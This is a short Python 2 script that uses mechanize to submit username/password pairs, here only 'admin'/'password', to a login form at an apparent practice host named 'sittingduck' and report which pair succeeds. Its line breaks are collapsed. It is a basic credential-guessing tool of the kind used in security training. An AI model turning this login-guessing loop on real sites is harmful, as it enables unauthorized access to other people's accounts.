#!/usr/bin/python import mechanize
mech = mechanize.Browser() mech.set_handle_equiv(True) mech.set_handle_redirect(True) mech.set_handle_referer(True)
users = [('admin', 'password')] mech.open('https://osw.sittingduck.bv/login.htm') for u, p in users: mech.select_form(nr=0) mech.form['user'] = u mech.form['pass'] = p response = mech.submit() if response.geturl() == 'https://osw.sittingduck.bv/login_success.html': print 'User/Password combo: ',''.join([u, '/', p]) break
